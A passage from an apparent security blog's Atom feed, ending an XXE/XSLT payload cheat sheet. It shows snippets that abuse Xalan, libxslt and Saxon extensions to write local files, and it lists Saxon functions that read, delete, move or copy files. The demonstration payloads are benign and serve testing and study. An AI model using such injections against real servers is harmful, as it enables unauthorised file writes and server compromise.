class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:open</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:write</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span>Hello world to local file.<span class="tag">&lt;/<span class="name">redirect:open</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:close</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>libxslt 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exsl:document</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exsl:document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Saxon PE/Saxon EE 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;local_file.txt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;Hello World to local file.&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:sequence</span> <span class="attr">select</span>=<span class="string">&quot;file:append-text($file, $text)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其他可以写入文件的函数有<code>file:append-text(), file:move(), file:copy(), file:delete(), file:exists(), file:is-file(), file:is-dir(), file:read(), file:write()</code></p>]]></content>
    
    
    <summary type="html">XXE payloads and attack methods.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="XXE" scheme="https://srpopty.github.io/tags/XXE/"/>
    
  </entry>
  
</feed>
